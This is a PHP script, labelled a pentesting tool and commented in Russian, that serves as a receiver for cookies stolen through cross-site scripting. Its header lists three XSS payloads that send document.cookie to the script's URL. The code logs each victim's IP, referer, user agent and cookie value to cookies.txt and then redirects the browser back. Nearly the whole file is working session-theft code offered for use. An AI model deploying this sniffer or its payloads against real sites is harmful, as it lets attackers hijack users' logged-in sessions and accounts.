<?php
/*
 PHP Sniff
 Pentesting Tools by Dit81
*/

/***************************************************
*
* USE: <script>img=new Image();img.src="http://site.com/xss/phpsniffer.php?p="+document.cookie;</script>
*	<script>document.location.replace("http://site.com/phpsniffer.php?p="+document.cookie)</script>
*	<script>location.href="http://site.com/phpsniffer.php?p="%2Bdocument.cookie</script>
*
***************************************************/


// Если p нет, то просто Redirect
if (empty($_GET["p"])){
	
	$str 	 = date("d.m.Y H:i:s") . "\r\n";
	$str 	.= "IP: " . $_SERVER["REMOTE_ADDR"] . "\r\n";
	$str 	.= "HTTP_REFERER: " . $_SERVER['HTTP_REFERER'] . "\r\n";
	$str 	.= "USER_AGENT: " . $_SERVER['USER_AGENT'] . "\r\n";
	$str 	.= "QUERY_STRING: " . $_SERVER['QUERY_STRING'] . "\r\n";
	$str 	.= "COOKIE: " . $_GET["p"] . "\r\n\r\n";

	write_cookie_file("cookies.txt", $str);
	
	//Redirect
	header('Location: ' . $_SERVER['HTTP_REFERER']);
	exit;

/*
	// Вывод доп. данных (REFERER и USER_AGENT)
	echo "HTTP REFERER: " . $_SERVER['HTTP_REFERER'] . "<br />";
	echo "USER_AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "<br />";

	// Читаем куки document.cookie
	echo "<script>window.alert( document.cookie );</script>";

	echo "<br />COOKIE:<br />";
	foreach ( $_COOKIE as $key => $value ) {
		echo $key . ' = ' . $value . "<br />";
	}

	// Запись в файл cookies.txt
	$query = $_SERVER['QUERY_STRING']; //эта часть скрипта принимает украденные cookies, переданные JavaScript'ом.
	$query .= "\n"; 					//каждая запись производится с новой строки
	$db = "cookies.txt"; 				//здесь мы определили файл, куда будет производиться запись полученных cookies.
	$fh = fopen ($db, "a+"); 			//открыли файл для записи, запись всегда будет производиться в конец файла.
	fputs($fh, "$query"); 				//записали cookies в файл.
	fclose($fh); 						//после записи закрыли файл.
*/

} else {
	//echo "GET: " . $_GET["p"]. "<br />";
	$str 	 = date("d.m.Y H:i:s") . "\r\n";
	$str 	.= "IP: " . $_SERVER["REMOTE_ADDR"] . "\r\n";
	$str 	.= "HTTP_REFERER: " . $_SERVER['HTTP_REFERER'] . "\r\n";
	$str 	.= "USER_AGENT: " . $_SERVER['USER_AGENT'] . "\r\n";
	$str 	.= "QUERY_STRING: " . $_SERVER['QUERY_STRING'] . "\r\n";
	$str 	.= "COOKIE: " . $_GET["p"] . "\r\n\r\n";

	write_cookie_file("cookies.txt", $str);
}

function write_cookie_file($filename, $str){
	// Открыть текстовый файл
	$f = fopen($filename,"a+");

	// Записать строку текста
	//fwrite($f, $str);
	fputs($f, $str);
	fclose($f);
}
?>
